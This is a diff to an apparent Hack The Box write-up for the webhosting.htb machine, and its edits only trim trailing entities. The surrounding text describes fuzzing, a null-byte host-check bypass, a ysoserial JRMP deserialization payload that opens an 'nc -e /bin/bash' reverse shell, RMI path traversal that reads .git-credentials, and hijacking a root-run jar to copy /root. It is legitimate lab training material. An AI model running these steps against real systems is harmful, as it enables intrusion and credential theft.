@@ -42,7 +42,7 @@ PORT     STATE SERVICE            VERSION
 5001/tcp open  ssl/commplex-link?
 ```
 
-We can take note of the `webhosting.htb` domain and add it to the `/etc/hosts` file.&#x20;
+We can take note of the `webhosting.htb` domain and add it to the `/etc/hosts` file.
 
 ### Initial Enumeration -> Fuzz Params
 
@@ -50,7 +50,7 @@ We have to add `www.webhosting.htb` to our `/etc/hosts` file to view the HTTPS a
 
 <figure><img src="../../.gitbook/assets/image (4091).png" alt=""><figcaption></figcaption></figure>
 
-We can try registering a user and logging in.&#x20;
+We can try registering a user and logging in.
 
 <figure><img src="../../.gitbook/assets/image (4092).png" alt=""><figcaption></figcaption></figure>
 
@@ -110,7 +110,7 @@ When looking at the Hacktricks page, the Authorization error seems to be somethi
 ```
 {% endcode %}
 
-However, in my case the `detail` variable has been set to `null`, even when I send this token in as part of either the `Cookie` or `Authorization: Bearer` headers. Perhaps we need to specify the service that we want or something.&#x20;
+However, in my case the `detail` variable has been set to `null`, even when I send this token in as part of either the `Cookie` or `Authorization: Bearer` headers. Perhaps we need to specify the service that we want or something.
 
 Based on this, I started to fuzz the parameters that we could send with this link with `wfuzz`:
 
@@ -127,7 +127,7 @@ $ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-mediu
 <TRUNCATED>
 ```
 
-Out of all the outputs, `account` and `service` had the greatest deviation from the rest of them, indicating that a completely different token was generated. `account` just requested us to login via HTTP, while the `service` one was interesting. Seems that it changes the `aud` parameter.&#x20;
+Out of all the outputs, `account` and `service` had the greatest deviation from the rest of them, indicating that a completely different token was generated. `account` just requested us to login via HTTP, while the `service` one was interesting. Seems that it changes the `aud` parameter.
 
 <figure><img src="../../.gitbook/assets/image (4098).png" alt=""><figcaption></figcaption></figure>
 
@@ -139,7 +139,7 @@ $ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-mediu
 000003637:   400        1 L      5 W        39 Ch       "scope"
 ```
 
-Seems that `scope` is the next parameter.&#x20;
+Seems that `scope` is the next parameter.
 
 <figure><img src="../../.gitbook/assets/image (4101).png" alt=""><figcaption></figcaption></figure>
 
@@ -401,7 +401,7 @@ $ ls
 docs  examples  hosting.war  host-manager  manager  ROOT
 ```
 
-The source code seems to be compiled within the `.war` file. We can decompile this online or `jd-gui`.&#x20;
+The source code seems to be compiled within the `.war` file. We can decompile this online or `jd-gui`.
 
 <figure><img src="../../.gitbook/assets/image (4108).png" alt=""><figcaption></figcaption></figure>
 
@@ -413,7 +413,7 @@ Within `RMIClientWrapper.class`, there's mention of other hostnames as well:
 
 <figure><img src="../../.gitbook/assets/image (4110).png" alt=""><figcaption></figcaption></figure>
 
-And this has to do with the `FileService` somehow.&#x20;
+And this has to do with the `FileService` somehow.
 
 We need a way to modify our session to become an Administrator. Since this is Tomcat, I found this page detailing how it is possible to become an administrator:
 
@@ -437,7 +437,7 @@ The key question in my head was around the `rmiHost` parameter and where we had 
 
 <figure><img src="../../.gitbook/assets/image (4114).png" alt=""><figcaption></figcaption></figure>
 
-By default, the HTTP request for this only includes the `domains.max` and `domains.start-template` parameters. Within the `ConfigurationServlet.class` file however, it shows that sending POST requesst to this updates the `Settings` variable using a hashmap.&#x20;
+By default, the HTTP request for this only includes the `domains.max` and `domains.start-template` parameters. Within the `ConfigurationServlet.class` file however, it shows that sending POST requesst to this updates the `Settings` variable using a hashmap.
 
 The code for the RMI portion takes the `rmi.host` parameter from the `Settings` variable and checks for whether it contains the `.htb` string. We can try to specify our IP address and bypass the check using a null byte.
 
@@ -474,7 +474,7 @@ The code makes a connection to port 9002 using the RMI service. As such, we can 
 
 {% embed url="https://ctftime.org/writeup/12656" %}
 
-I didn't have anything else I could do, so I tried it using the different CommonsCollections there were within `ysoserial`.&#x20;
+I didn't have anything else I could do, so I tried it using the different CommonsCollections there were within `ysoserial`.
 
 ```
 $ /usr/lib/jvm/java-8-openjdk-amd64/bin/java -cp ~/ysoserial-all.jar ysoserial.exploit.JRMPListener 9002 CommonsCollections6 'nc -e /bin/bash 10.10.14.24 4444' 
@@ -526,15 +526,15 @@ udp        0      0 127.0.0.53:53           0.0.0.0:*                           
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
 ```
 
-These other ports might be run by a user on the main machine. The most interesting thing was port 9002 which was listening within the container.&#x20;
+These other ports might be run by a user on the main machine. The most interesting thing was port 9002 which was listening within the container.
 
 The idea of `FileService` was still present in my head. Perhaps there was a way to interact with the actual service that was listening on port 9002 reachable from this container, since we injected code into the `rmi.host` parameter to get this shell in the first place. I took another look at the source code for the `FileService.class` file:
 
 <figure><img src="../../.gitbook/assets/image (4116).png" alt=""><figcaption></figcaption></figure>
 
-Problem is, there's no actual code present that would interact with the service. Based on the functions available, we should be able to use the `getFile` method to read stuff from the directory using a custom client that we can create using all the code present.&#x20;
+Problem is, there's no actual code present that would interact with the service. Based on the functions available, we should be able to use the `getFile` method to read stuff from the directory using a custom client that we can create using all the code present.
 
-> Code is at the end of the writeup. &#x20;
+> Code is at the end of the writeup. 
 
 I took these files:
 
@@ -542,7 +542,7 @@ I took these files:
 * `FileService.class`
 * `RMIClientWrapper.class` and modified it such that I can specify the file that I want to read.
 
-Afterwards, I compiled the code within `com/htb/hosting/rmi` to be consistent with the `package` variable I used.&#x20;
+Afterwards, I compiled the code within `com/htb/hosting/rmi` to be consistent with the `package` variable I used.
 
 ```
 $ javac com/htb/hosting/rmi/RMIClientWrapper.java 
@@ -551,7 +551,7 @@ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 
 Then, we need to forward port 9002 using `chisel`. I did my initial testing, and realised that we need to include the `CryptUtil.class` files since the service seems to expect an encrypted path.
 
-Afterwards, we can compile and run the RMIClient code and find that it works in listing directories and reading files! Reading `/etc/passwd` just shows us that `developer` is a user on the machine, and the user's directory contains some useful information.&#x20;
+Afterwards, we can compile and run the RMIClient code and find that it works in listing directories and reading files! Reading `/etc/passwd` just shows us that `developer` is a user on the machine, and the user's directory contains some useful information.
 
 ```
 $ proxychains java com/htb/hosting/rmi/RMIClientWrapper "/../../home/developer/" "/../../home/developer/.git-credentials" 
@@ -654,7 +654,7 @@ Extracting from this file reveals that it contains the configurations that we ne
 
 ### Hijack Configuration -> Read Root Creds
 
-Since `root` is executing the `quarantine.jar` file, and the quarantine has to scan all of the files present within a specified directory, we can modify it such that it is able to read and copy the entire `/root` directory, which includes the flag.&#x20;
+Since `root` is executing the `quarantine.jar` file, and the quarantine has to scan all of the files present within a specified directory, we can modify it such that it is able to read and copy the entire `/root` directory, which includes the flag.
 
 Here are the parameters we can change:
 
@@ -730,7 +730,7 @@ We can then `su` to `root`:
 
 ## Final RMIClient Code
 
-> This is not my code. I had help from another user for this machine because I was stuck. However, I did learn a lot from this code.&#x20;
+> This is not my code. I had help from another user for this machine because I was stuck. However, I did learn a lot from this code.
 
 ```java
 package com.htb.hosting.rmi;
